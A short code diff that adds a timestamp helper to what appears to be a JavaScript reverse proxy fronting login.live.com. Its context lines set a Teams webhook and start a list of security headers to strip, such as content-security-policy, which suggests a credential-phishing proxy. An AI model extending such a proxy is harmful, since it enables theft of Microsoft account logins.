@@ -12,6 +12,11 @@ const upstream_personal = "login.live.com";
 const upstream_path = "/";
 const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;
 
+// Helper function to get current timestamp
+function getCurrentTimestamp() {
+  return new Date().toISOString();
+}
+
 // headers to delete from upstream responses
 const delete_headers = [
   "content-security-policy",
